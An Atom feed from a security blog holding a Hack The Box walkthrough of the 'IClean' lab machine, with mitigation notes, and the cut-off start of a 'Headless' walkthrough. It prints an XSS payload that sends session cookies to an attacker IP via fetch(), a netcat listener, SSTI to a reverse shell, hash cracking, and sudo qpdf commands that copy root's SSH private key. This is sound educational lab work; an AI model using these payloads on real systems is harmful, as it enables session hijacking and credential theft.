<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://emdeh.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://emdeh.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-05-27T04:14:50+00:00</updated><id>https://emdeh.github.io/feed.xml</id><title type="html">emdeh</title><subtitle>If you can&apos;t explain it simply, you don&apos;t understand it well enough. </subtitle><entry><title type="html">IClean - XSS, SSTI, and Sudo abuse.</title><link href="https://emdeh.github.io/blog/2024/iclean-walkthrough/" rel="alternate" type="text/html" title="IClean - XSS, SSTI, and Sudo abuse."/><published>2024-05-27T14:14:00+00:00</published><updated>2024-05-27T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/iclean-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/iclean-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>IClean is rated as a medium difficulty. It begins with enumerating a Flask web app and exploiting a XSS vulnerability to steal a session cookie. The cookie is used to bypass the <code class="language-plaintext highlighter-rouge">/login</code> page authentication and access a <code class="language-plaintext highlighter-rouge">/dashboard</code> page. An SSTI vulnerability is exploited on this page to establish remote code execution. Due to hardcoded credentials in a python script, hashes are dumped from a database. One hash is cracked, which enables lateral movement to a standard user’s account. The standard user has <code class="language-plaintext highlighter-rouge">sudo</code> rights over a binary, which is exploited to exfiltrate the <code class="language-plaintext highlighter-rouge">root</code> user’s <code class="language-plaintext highlighter-rouge">/id_rsa</code> file to achieve privilege escalation.</p> <h2 id="vulnerabilities-explored">Vulnerabilities explored</h2> <h3 id="cross-site-scripting-scripting">Cross-Site Scripting scripting</h3> <p>As discussed in <a href="https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored">Headless walkthrough</a>, Cross-Site Scripting (XSS) is a type of vulnerability that allows a threat actor to inject a malicious payload into content that other users will view. When the content is viewed, the malicious payload will be executed, which can lead to data theft, session hijacking, and other types of breaches. See the linked article for a deeper explanation on XSS vulnerabilities.</p> <h3 id="session-hijacking">Session hijacking</h3> <p>Also discussed in the <a href="https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored">Headless walkthrough</a>, session hijacking involves exploiting a session by stealing or predicting a valid token. The token can then be used to bypass authentication mechanisms and/or steal data.</p> <h4 id="mitigation">Mitigation</h4> <p>Some additional mitigation to what was discussed in the <a href="https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored">Headless walkthrough</a> article include:</p> <ul> <li><strong>Use HTTPS</strong>: Ensure all communication between the client and server is encrypted using HTTPS to prevent session hijacking via network sniffing.</li> <li><strong>User-Agent and IP Binding</strong>: Bind the session to the user’s IP address and User-Agent string to make session hijacking more difficult.</li> </ul> <h3 id="server-side-template-injection">Server-Side Template Injection</h3> <p>Server-Side Template Injection (SSTI) occurs when a a threat actor exploits a web application’s template rendering system by injecting malicious code into the templates. This happens when the template engine fails to properly distinguish between the template code and user-provided data meant to populate the placeholders. As a result, the injected code is processed as part of the template, leading to the execution of malicious payloads.</p> <h4 id="mitigation-1">Mitigation</h4> <p>To avoid SSTI vulnerabilities the following can be considered:</p> <ul> <li><strong>Input Validation</strong>: Validate and sanitise all user inputs to ensure they do not contain executable code.</li> <li><strong>Use Secure Templates</strong>: Choose template engines that offer built-in security features and avoid using insecure or outdated ones.</li> <li><strong>Escape User Inputs</strong>: Always escape user inputs before including them in templates to prevent execution as code.</li> <li><strong>Whitelist Inputs</strong>: Use a whitelist approach to limit the types of data that can be included in templates.</li> <li><strong>Limit Template Functionality</strong>: Restrict the capabilities of the template engine to minimise the risk of code execution.</li> <li><strong>Separate Data and Code</strong>: Ensure a clear separation between the template logic and user data to prevent mixing executable code with user inputs.</li> <li><strong>Security Audits</strong>: Regularly perform security audits and code reviews to identify and fix potential SSTI vulnerabilities.</li> <li><strong>Keep Dependencies Updated</strong>: Regularly update the template engine and other dependencies to the latest versions with security patches.</li> </ul> <h3 id="insecure-coding---hardcoded-credentials">Insecure coding - hardcoded credentials</h3> <p>Similarly to <a href="https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored">Headless</a>, insecure coding practices can lead to significant attack vectors. In this case, credentials for a database were hardcoded, which enabled lateral movement.</p> <h4 id="mitigation-2">Mitigation</h4> <ul> <li><strong>Environment variables:</strong> Store credentials in environment variables rather than in the source code.</li> </ul> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="n">db_password</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">getenv</span><span class="p">(</span><span class="sh">'</span><span class="s">DB_PASSWORD</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <ul> <li><strong>Configuration files:</strong> Use configuration files that are not included in version control to store credentials and sensitive information, ensuring these files are secured with appropriate permissions.</li> </ul> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"db_password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"your_password"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <ul> <li><strong>Secrets Management Tools</strong>: Use dedicated secrets management tools like AWS Secrets Manager or Azure Key Vault.</li> <li><strong>Secrets Rotation</strong>: Regularly rotate secrets and credentials to reduce the risk of compromised credentials.</li> <li><strong>Secure Code Reviews</strong>: Conduct regular code reviews with a focus on security to identify and remediate hardcoded credentials and other insecure coding practices.</li> </ul> <h3 id="sudo-misconfiguration">Sudo misconfiguration</h3> <p>As discussed in <a href="https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored">Headless</a>, the <code class="language-plaintext highlighter-rouge">sudoers</code> file controls which users can execute commands with elevated privileges. If this file is configured to allow a user to run certain commands as the superuser.</p> <p>Some binaries, when executed with elevated privileges, can be used to perform tasks that compromise the security of the system. For instance, if a binary allows file manipulation, a threat actor can use it to gain higher privileges or conduct further exfiltration of sensitive data.</p> <h2 id="tools">Tools</h2> <ul> <li>Nmap</li> <li>Gobuster</li> <li>Burpsuite</li> <li>Hashcat</li> </ul> <h2 id="tactics-and-methods">Tactics and Methods</h2> <h3 id="enumerating-webpages">Enumerating webpages</h3> <ul> <li>Gobuster was used to enumerate pages of the site, which identified the target page <code class="language-plaintext highlighter-rouge">/dashboard</code>.</li> </ul> <h3 id="stealing-cookies-by-exploiting-a-reflected-xss-vulnerability">Stealing cookies by exploiting a Reflected XSS vulnerability</h3> <ul> <li>Burpsuite was used to observer the HTTP requests while using the target site, ultimately leading to the identification of a XSS vulnerability and the exfiltration of a session cookie.</li> </ul> <h3 id="authentication-bypass-via-session-hijacking">Authentication bypass via session hijacking</h3> <ul> <li>Authentication to the target page <code class="language-plaintext highlighter-rouge">/dashboard</code> was achieved by using the stolen cookie to hijack a session.</li> </ul> <h3 id="remote-code-execution-by-exploiting-a-ssti-vulnerability">Remote code execution by exploiting a SSTI vulnerability</h3> <ul> <li>The SSTI vulnerability in the <code class="language-plaintext highlighter-rouge">/QRGenerator</code> was exploited to achieve remote code execution and establish a reverse shell within the context of the <code class="language-plaintext highlighter-rouge">www-data</code> user.</li> </ul> <h3 id="brute-forcing-hashed-passwords">Brute-forcing hashed passwords</h3> <ul> <li>Hashcat was used to crack the hashes stolen from the <code class="language-plaintext highlighter-rouge">users</code> database and compromise a standard user’s account.</li> </ul> <h3 id="abusing-sudo-to-exfiltrate-sensitive-data-and-achieve-privilige-escalation">Abusing <code class="language-plaintext highlighter-rouge">sudo</code> to exfiltrate sensitive data and achieve privilige escalation</h3> <ul> <li>Privilege escalation was achieved by stealing the <code class="language-plaintext highlighter-rouge">root</code> user’s <code class="language-plaintext highlighter-rouge">id_rsa</code> file by exploiting a vulnerability in the <code class="language-plaintext highlighter-rouge">qpdf</code> binary that the compromised user had <code class="language-plaintext highlighter-rouge">sudo</code> rights over.</li> </ul> <hr/> <h1 id="enumeration">Enumeration</h1> <h2 id="nmap-scanning">Nmap scanning</h2> <p>As always, the target is scanned with Nmap.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/iclean/scans]
└─<span class="nv">$ </span>nmap <span class="nt">-A</span> 10.129.10.21 | <span class="nb">tee </span>nmap-output.txt
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-24 01:21 EDT
Nmap scan report <span class="k">for </span>10.129.10.21
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.79 seconds
</span></code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Port 22</li> <li>Port 80</li> </ol> <h2 id="port-80-enumeration">Port 80 Enumeration</h2> <p>Navigating to the site results in Server Not Found but reveals the domain: <code class="language-plaintext highlighter-rouge">http://capiclean.htb/</code>.</p> <p>Adding to <code class="language-plaintext highlighter-rouge">/etc/hosts/</code> file resolves the target to a landing page:</p> <p><img src="/assets/img/2024/iclean/icleanmimetypes.png" alt="icleanmimetypes.png" class="auto-resize"/></p> <p>There is a login page at <code class="language-plaintext highlighter-rouge">capiclean.htb/login</code>, and a page to submit a quotes at <code class="language-plaintext highlighter-rouge">capiclean.htb/quote</code>.</p> <h2 id="further-page-enumeration">Further page enumeration</h2> <p>Further enumeration was conducted with Gobuster:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/iclean/scans]
└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://capiclean.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-1.0.txt <span class="nt">-t</span> 100 <span class="nt">-x</span> php,html <span class="nt">-o</span> gobuster-scan.txt
</code></pre></div></div> <p>This command uses Gobuster to brute-force directories (pages) on the site.</p> <ul> <li><strong><code class="language-plaintext highlighter-rouge">gobuster dir</code></strong>: This tells Gobuster to use its directory and file brute-forcing mode.</li> <li><code class="language-plaintext highlighter-rouge">**-u http://capiclean.htb**</code>: Specifies the target URL to be scanned,</li> <li><code class="language-plaintext highlighter-rouge">**-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt**:</code> Specifies the path to the wordlist that Gobuster will use for brute-forcing.</li> <li><code class="language-plaintext highlighter-rouge">**-t 100**</code>: Sets the number of concurrent threads to use for the scan. In this case, Gobuster will use 100 threads to speed up the process.</li> <li><code class="language-plaintext highlighter-rouge">**-x php,html**</code>: Specifies the file extensions to append to each word in the wordlist. Gobuster will check for both <code class="language-plaintext highlighter-rouge">.php</code> and <code class="language-plaintext highlighter-rouge">.html</code> extensions.</li> <li><code class="language-plaintext highlighter-rouge">**-o gobuster-scan.txt**</code>: Specifies the output file where the results will be saved. The results of this scan will be written to <code class="language-plaintext highlighter-rouge">gobuster-scan.txt</code>.</li> </ul> <p>Early results reveal a <code class="language-plaintext highlighter-rouge">/dashboard</code> page with a status code of 302, suggesting it was found but redirected to the root of the site; presumably because it is behind the <code class="language-plaintext highlighter-rouge">/login</code> page. This is likely the target page.</p> <p><img src="/assets/img/2024/iclean/icleanlandingpage.png" alt="icleanlandingpage.png" class="auto-resize"/></p> <h2 id="quote-page-enumeration">Quote page enumeration</h2> <p>Observing the POST request for the <code class="language-plaintext highlighter-rouge">/quote</code> page in Burpsuite reveals the server will accept image types. This may lead to the possibility of exfiltrating cookies via XSS.</p> <p><img src="/assets/img/2024/iclean/iclean302dashboard.png" alt="iclean302dashboard.png" class="auto-resize"/></p> <h1 id="initial-access">Initial access</h1> <h2 id="xss-to-exfiltrate-cookies">XSS to exfiltrate cookies</h2> <p>Given there was a login page, it may be possible to perform an XSS attack to extract session cookies and impersonate a user by appending the following to the URL parameter in the POST request:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service=<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">fetch("http://IP:4444/"+document.cookie);</span><span class="nt">&gt;</span>
</code></pre></div></div> <p>This attempts to exfiltrate cookies to a remote server.</p> <ul> <li><code class="language-plaintext highlighter-rouge">&amp;service=</code>: This part of the string is the URL parameter named <code class="language-plaintext highlighter-rouge">service</code>.</li> <li><code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=...&gt;</code>: This is an HTML <code class="language-plaintext highlighter-rouge">img</code> tag. Normally, the <code class="language-plaintext highlighter-rouge">src</code> attribute specifies the path to the image. However, in this case, an <code class="language-plaintext highlighter-rouge">x</code> is used to trigger an error event.</li> <li><code class="language-plaintext highlighter-rouge">onerror=...</code>: The <code class="language-plaintext highlighter-rouge">onerror</code> attribute is an event handler that executes JavaScript code when an error occurs while loading the image (because <code class="language-plaintext highlighter-rouge">src=x</code> will fail).</li> <li><code class="language-plaintext highlighter-rouge">fetch("http://RemoteIP:4444/"+document.cookie);</code>: This JavaScript code is executed when the image fails to load. It uses the <code class="language-plaintext highlighter-rouge">fetch</code> function to make an HTTP request to the attacker’s server (<code class="language-plaintext highlighter-rouge">http://ATTACK_IP:4444/</code>). The <code class="language-plaintext highlighter-rouge">+document.cookie</code> part appends the document’s cookies to the URL, effectively sending them to the attacker’s server.</li> </ul> <p>Repeating the POST request after adding the payload, and URL-encoding it, looks like this:</p> <p><img src="/assets/img/2024/iclean/icleanXSSpayload.png" alt="icleanXSSpayload.png" class="auto-resize"/></p> <p>Starting a listener captures the cookie as expected:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/iclean/credentials]
└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.10.21] 56354
GET /session<span class="o">=</span>eyJyb2xlIjoiMj&lt;SNIP&gt;.0qvcHllPTlaUvubvwVzl77I1glM HTTP/1.1
Host: 10.10.14.6:4444
Connection: keep-alive
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/116.0.0.0 Safari/537.36
Accept: <span class="k">*</span>/<span class="k">*</span>
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
</code></pre></div></div> <h2 id="session-hijacking-with-stolen-cookie">Session hijacking with stolen cookie</h2> <p>The cookie can be used to impersonate a session. By inspecting the login page, the cookie can be added to storage. Then, attempting to browse to the <code class="language-plaintext highlighter-rouge">/dashboard</code> page, which would typically sit behind the login page, can be done by simply changing the URL.</p> <p><img src="/assets/img/2024/iclean/icleansessionhijack.png" alt="icleansessionhijack.png" class="auto-resize"/></p> <p>As the session will use the stolen cookie, the page loads as expected.</p> <p><img src="/assets/img/2024/iclean/icleandashboardpage.png" alt="icleandashboardpage.png" class="auto-resize"/></p> <h2 id="dashboard-enumeration">Dashboard enumeration</h2> <p>Generating an invoice, then using the invoice number to generate a QR creates a link that can then be submitted to return a scannable invoice.</p> <p><img src="/assets/img/2024/iclean/icleaninvoice.png" alt="icleaninvoice.png" class="auto-resize"/></p> <p>Observing the resulting POST request in Burpsuite suggests this may be the vector to obtain a reverse shell through a Server-Side Template Injection (SSTI).</p> <h2 id="server-side-template-injection-for-a-reverse-shell">Server-Side Template Injection for a reverse shell</h2> <h3 id="identifying-the-template-engine">Identifying the Template engine</h3> <p>git a The HTTP headers reveal the server is using the <code class="language-plaintext highlighter-rouge">Werkzeug/2.3.7</code> utility library for Python, which is common for Flask applications. Flask typically defaults to using <code class="language-plaintext highlighter-rouge">Jinja2</code> for templating.</p> <ul> <li><strong>Werkzeug</strong>: Provides the underlying Web Server Gateway Interface (WSGI) functionality and utilities for Flask.</li> <li><strong>Flask</strong>: A web framework that uses Werkzeug and often Jinja2 for templating.</li> <li><strong>Jinja2</strong>: The default template engine used by Flask for rendering HTML templates. <h3 id="testing">Testing</h3> </li> </ul> <p>Using simple payloads can confirm if SSTI is possible. e.g., ``.</p> <p>The diagram below from <a href="https://portswigger.net/research/server-side-template-injection">PortsSwigger</a> can help confirm if an SSTI vulnerability is present and also identify the underlying template engine.</p> <p><img src="/assets/img/2024/iclean/portswiggerssti.png" alt="portswiggerssti.png" class="auto-resize"/></p> <h3 id="construct-the-malicious-payload"><strong>Construct the Malicious Payload</strong></h3> <p>Assuming Jinja2, and with the help of <a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/">A Simple Flask (Jinja2) Server-Side Template Injection (SSTI) Example (kleiber.me)</a> the following payload was constructed:</p> <pre><code class="language-```">
URL-encoding and inputting the payload into the vulnerable parameter and sending the request results in a shell.

&lt;img src="/assets/img/2024/iclean/icleanqrgenhttp.png" alt="icleanqrgenhttp.png" class="auto-resize"&gt;


&lt;img src="/assets/img/2024/iclean/icleannclistener.png" alt="icleannclistener.png" class="auto-resize"&gt;

### Stabilising the shell

The shell can be stabilised with the following python command.

```python
python -c 'import pty; pty.spawn("/bin/bash")'
</code></pre> <h1 id="lateral-movement">Lateral movement</h1> <h2 id="stealing-hashes">Stealing hashes</h2> <p>In the present working directory, there is an <code class="language-plaintext highlighter-rouge">app.py</code> script. Within it are hardcoded credentials for a database.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': '&lt;SNIP&gt;',
    'database': 'capiclean'
</code></pre></div></div> <p>At the start of the script there is a import for <code class="language-plaintext highlighter-rouge">pymysql</code>, confirming the type of database to be MySQL.</p> <p>As the Database is running locally, it can be connected to by passing the <code class="language-plaintext highlighter-rouge">username</code> and inputting the <code class="language-plaintext highlighter-rouge">password</code> when prompted:</p> <p><img src="/assets/img/2024/iclean/icleanmysqlauth.png" alt="icleanmysqlauth.png" class="auto-resize"/></p> <p>Listing the databases finds one named <code class="language-plaintext highlighter-rouge">capiclean</code>.</p> <pre><code class="language-mysql">mysql&gt; SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)
</code></pre> <p>Switching to <code class="language-plaintext highlighter-rouge">capiclean</code> and listing tables reveals a table of <code class="language-plaintext highlighter-rouge">users</code>.</p> <pre><code class="language-mysql">mysql&gt; USE capiclean;
USE capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)
</code></pre> <h3 id="dumping-database-table">Dumping database table</h3> <p>Selecting all rows from the <code class="language-plaintext highlighter-rouge">users</code> table reveals two rows with hashed passwords.</p> <p><img src="/assets/img/2024/iclean/icleandbhashes.png" alt="icleandbhashes.png" class="auto-resize"/></p> <h2 id="cracking-the-hash">Cracking the hash</h2> <p>The hash is most likely a <code class="language-plaintext highlighter-rouge">SHA-256</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The following 8 hash-modes match the structure of your input <span class="nb">hash</span>:

      <span class="c"># | Name                                                       | Category</span>
  <span class="o">======</span>+<span class="o">============================================================</span>+<span class="o">======================================</span>
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 <span class="o">(</span>Streebog<span class="o">)</span> 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256<span class="o">(</span>utf16le<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span>                                     | Raw Hash
  20800 | sha256<span class="o">(</span>md5<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span>                                         | Raw Hash salted and/or iterated
  21400 | sha256<span class="o">(</span>sha256_bin<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span>                                  | Raw Hash salted and/or iterated

Please specify the hash-mode with <span class="nt">-m</span> <span class="o">[</span>hash-mode].

Started: Sun May 26 20:00:37 2024
Stopped: Sun May 26 20:00:39 2024
</code></pre></div></div> <p>Using Hashcat with <code class="language-plaintext highlighter-rouge">-m 1400</code> cracks it.</p> <p><img src="/assets/img/2024/iclean/icleancrackedhash.png" alt="icleancrackedhash.png" class="auto-resize"/></p> <h2 id="logging-in-via-ssh">Logging in via SSH</h2> <p>The stolen password can now be used to login via SSH, and the first flag is found.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/iclean/credentials]
└─<span class="nv">$ </span>ssh consuela@capiclean.htb
The authenticity of host <span class="s1">'capiclean.htb (10.129.11.43)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:3nZua2j9n72tMAHW1xkEyDq3bjYNNSBIszK1nbQMZfs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>capiclean.htb<span class="s1">' (ED25519) to the list of known hosts.
consuela@capiclean.htb'</span>s password:
&lt;SNIP&gt;
consuela@iclean:~<span class="nv">$ </span><span class="nb">pwd</span>
/home/consuela
consuela@iclean:~<span class="nv">$ </span><span class="nb">ls
</span>user.txt
consuela@iclean:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;SNIP&gt;
</code></pre></div></div> <h1 id="privilege-escalation">Privilege escalation</h1> <h2 id="abusing-sudo">Abusing sudo</h2> <p>Checking <code class="language-plaintext highlighter-rouge">sudo</code> rights, reveals a binary that the <code class="language-plaintext highlighter-rouge">consuela</code> user can run.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>consuela@iclean:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>consuela:
Matching Defaults entries <span class="k">for </span>consuela on iclean:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User consuela may run the following commands on iclean:
    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/qpdf
</code></pre></div></div> <blockquote> <p><strong><em>The <code class="language-plaintext highlighter-rouge">qpdf</code> binary is a program and C++ library for structural, content-preserving transformations on PDF files.</em></strong></p> </blockquote> <p>The usage help menu gives some clues about the utility.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>consuela@iclean:~<span class="nv">$ </span>qpdf <span class="nt">--help</span><span class="o">=</span>usage
Read a PDF file, apply transformations or modifications, and write
a new PDF file.

Usage: qpdf <span class="o">[</span>infile] <span class="o">[</span>options] <span class="o">[</span>outfile]
   OR  qpdf <span class="nt">--help</span><span class="o">[={</span>topic|--option<span class="o">}]</span>

- infile, options, and outfile may be <span class="k">in </span>any order as long as infile
  precedes outfile.
- Use <span class="nt">--empty</span> <span class="k">in </span>place of an input file <span class="k">for </span>a zero-page, empty input
- Use <span class="nt">--replace-input</span> <span class="k">in </span>place of an output file to overwrite the
  input file with the output
- outfile may be - to write to stdout<span class="p">;</span> reading from stdin is not supported
- @filename is an argument file<span class="p">;</span> each line is treated as a separate
  command-line argument
- @- may be used to <span class="nb">read </span>arguments from stdin
- Later options may override earlier options <span class="k">if </span>contradictory

Related options:
  <span class="nt">--empty</span>: use empty file as input
  <span class="nt">--job-json-file</span>: job JSON file
  <span class="nt">--replace-input</span>: overwrite input with output

For detailed <span class="nb">help</span>, visit the qpdf manual: https://qpdf.readthedocs.io
</code></pre></div></div> <p>After reading the <a href="[GitHub - qpdf/qpdf: QPDF: A content-preserving PDF document transformer](https://github.com/qpdf/qpdf)">documentation</a>, it seems there is an option to add a file to an empty pdf and convert it a <code class="language-plaintext highlighter-rouge">qdf</code> format, which would typically be used to debug or analyse the inner details of a legitimate pdf.</p> <p>As the user can run the binary as <code class="language-plaintext highlighter-rouge">sudo</code>, this can be exploited to exfiltrate data that would otherwise be inaccessible to the <code class="language-plaintext highlighter-rouge">consuela</code> user.</p> <h2 id="exfiltrating-sensitive-data">Exfiltrating sensitive data</h2> <p>For example, the following command has appended the <code class="language-plaintext highlighter-rouge">root</code> flag from <code class="language-plaintext highlighter-rouge">/root/</code> to a new file that is accessible to the current user.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>consuela@iclean:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/qpdf <span class="nt">--empty</span> /tmp/test.txt <span class="nt">--qdf</span> <span class="nt">--add-attachment</span> /root/root.txt <span class="nt">--</span>
consuela@iclean:~<span class="nv">$ </span><span class="nb">cat</span> /tmp/test.txt | <span class="nb">grep</span> <span class="nt">-A</span> 30 <span class="s2">"root"</span>
&lt;SNIP&gt;
</code></pre></div></div> <p>But that’s too easy. The <code class="language-plaintext highlighter-rouge">admin</code> user’s <code class="language-plaintext highlighter-rouge">id_rsa</code> file could also be exfiltrated:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>consuela@iclean:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/qpdf <span class="nt">--empty</span> /tmp/id_rsa <span class="nt">--qdf</span> <span class="nt">--add-attachment</span> /root/.ssh/id_rsa <span class="nt">--</span>
consuela@iclean:~<span class="nv">$ </span><span class="nb">cat</span> /tmp/id_rsa | <span class="nb">grep</span> <span class="nt">-A</span> 10 <span class="s2">"BEGIN"</span> /tmp/id_rsa
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
b3BlbnNzaC1&lt;SNIP&gt;
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
endstream
endobj
consuela@iclean:~<span class="err">$</span>
</code></pre></div></div> <p>Taking the key and adding it to a file with <code class="language-plaintext highlighter-rouge">chmod 600</code> permissions</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/iclean/credentials]
└─<span class="nv">$ </span>nano id_rsa_admin
┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/iclean/credentials]
└─<span class="nv">$ </span><span class="nb">chmod </span>600 id_rsa_admin
┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/iclean/credentials]
└─<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa_admin root@capiclean.htb
Welcome to Ubuntu 22.04.4 LTS <span class="o">(</span>GNU/Linux 5.15.0-101-generic x86_64<span class="o">)</span>
&lt;SNIP?
root@iclean:~# <span class="nb">pwd</span>
/root
root@iclean:~# <span class="nb">ls
</span>root.txt  scripts
root@iclean:~# <span class="nb">cat </span>root.txt
33e5361&lt;SNIP&gt;
</code></pre></div></div> <p>And the root flag is found.</p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="medium-box"/><category term="HTB"/><category term="XSS"/><category term="Reflected-XSS"/><category term="Cross-Site-Scripting"/><category term="SSTI"/><category term="Server-Side-Template-Injection"/><category term="cookies"/><category term="cookie-manipulation"/><category term="session-hijacking"/><category term="command-injection"/><category term="sudo-misconfiguration"/><category term="secure-coding"/><category term="hardcoded-credentials"/><category term="cracking-hashes"/><category term="mysql"/><summary type="html"><![CDATA[IClean - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Headless - XSS, Command Injection, and Sudo abuse.</title><link href="https://emdeh.github.io/blog/2024/headleass-walkthrough/" rel="alternate" type="text/html" title="Headless - XSS, Command Injection, and Sudo abuse."/><published>2024-04-15T14:14:00+00:00</published><updated>2024-04-15T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/headleass-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/headleass-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Headless is rated as an easy box. It begins with exploiting a Reflected Cross-Site Scripting (XSS) vulnerability to steal a cookie. Requests to a restricted page are manipulated to include the stolen cookie to 